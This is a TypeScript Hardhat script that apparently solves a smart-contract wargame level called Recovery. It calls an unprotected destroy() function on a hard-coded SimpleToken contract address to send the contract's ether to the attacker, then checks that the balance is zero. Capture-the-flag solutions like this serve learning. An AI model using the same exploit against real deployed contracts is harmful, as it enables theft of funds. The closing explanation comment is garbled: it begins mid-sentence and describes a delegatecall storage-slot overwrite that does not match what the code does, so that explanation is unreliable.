import { ethers } from "hardhat";
import { abi } from "../../artifacts/contracts/17.Recovery/SimpleToken.sol/SimpleToken.json";
import { Contract } from "ethers";
import { SignerWithAddress } from "@nomiclabs/hardhat-ethers/signers";

function setTargetContract() {
  const contractAddress = "0x428cE364C5206AAA84dCb415096398c4F8b14106";
  return new Contract(contractAddress, abi);
}

async function checkSucces(attacker: SignerWithAddress, target: Contract) {
  const balance = await attacker.provider!.getBalance(target.address);
  console.log("Success: ", balance.isZero());
}

async function main() {
  const [attacker] = await ethers.getSigners();
  const target = setTargetContract();
  const tx = await target.connect(attacker).destroy(attacker.address);
  await tx.wait();
  checkSucces(attacker, target);
}

main().catch((error) => {
  console.error(error);
  process.exitCode = 1;
});

// Explanation:
// You can easily find the contract created by the recovery contract on etherscan for rinkeby

// of the first storage slot of the calling contract.
// We are going to put there the address of a library we created.
// This library, if called in delegate call will change the value of the third
// storage slot of calling contract, which is in our case, owner.
